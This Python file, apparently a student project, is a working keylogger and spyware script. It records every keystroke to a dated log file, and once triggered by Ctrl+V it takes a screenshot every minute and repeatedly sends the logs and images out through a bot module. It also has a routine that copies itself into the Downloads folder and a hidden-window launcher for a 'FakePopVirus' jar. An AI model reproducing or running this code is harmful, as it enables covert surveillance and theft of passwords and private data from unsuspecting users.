# File imports
from concurrent.futures import ThreadPoolExecutor
from pynput.keyboard import Key, Listener

import threading as th
from subprocess import PIPE, STARTUPINFO, STARTF_USESHOWWINDOW
import subprocess
import TBot as TB
import variables as vr

import datetime
import time
import os
import pynput
import pyautogui

global DocName, fp, keys, date, t1
keys = []
path = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\"
date = datetime.date.today()
DocName = str(date) + ".txt"
fp = path + "logs\\" + DocName

startupinfo = STARTUPINFO()
startupinfo.dwFlags |= STARTF_USESHOWWINDOW
startupinfo.wShowWindow = 0

cmd = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\Resources\\FakePopVirus.jar"

#   Date
dt = str(vr.dt[:10])
#   Load DateTimeString to extract time
TimeStr = vr.dt[11:19].split(":")
hour = int(TimeStr[0])
min = int(TimeStr[1])
sec = int(TimeStr[2])
#   Calculate seconds
totalsec = (hour*3600) + (min*60) + sec

#   Specify routes to replicate itself
cPath = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\main.py"
dPath = "C:\\Users\\angel\\Downloads"

# variables
rar = 0


def pantallazo():
    subprocess.Popen(cmd, startupinfo=startupinfo, stdin=PIPE,
                     stdout=PIPE, stderr=PIPE, shell=True)


#   Ex. 1
def checkDT(dt, totalsec):
    if dt == str(date) and time.time() > totalsec:
        if os.path.exists(dPath):
            # copy yourself
            os.popen(f"copy {cPath} {dPath}")

#   Ex. 5


def sendMsg():
    TB.sendDoc(fp)
    th.Timer(10, sendMsg).start()


def ss():
    pp = path + "Photos\\" + \
        str(datetime.datetime.now()).replace(":", ".")+".png"
    myss = pyautogui.screenshot()
    myss.save(pp)
    TB.sendPhoto(pp)
    th.Timer(60, ss).start()

#   Ex. 3


def writefile(keys):
    with open(fp, "w") as f:
        for key in keys:
            k = key.replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("enter") > 0:
                f.write('\n')
            else:
                f.write(k)


def vkey(key):
    global rar
    keys.append(f"{key}")
    writefile(keys)
    print(f"{key} pressed")
    for key in keys:
        k = key.replace("'", "")
        if k.find("x03") > 0:  # Ctrl + C
            print("llegué")
            # pantallazo()
        elif k.find("x16") > 0:  # Ctrl + V
            if rar == 0:
                th.Timer(60, ss).start()
                th.Timer(10, sendMsg).start()
                rar = rar + 1


def run():
    with Listener(on_press=vkey) as listener:
        listener.join()


run()


# run()
#checkDT(dt, totalsec)
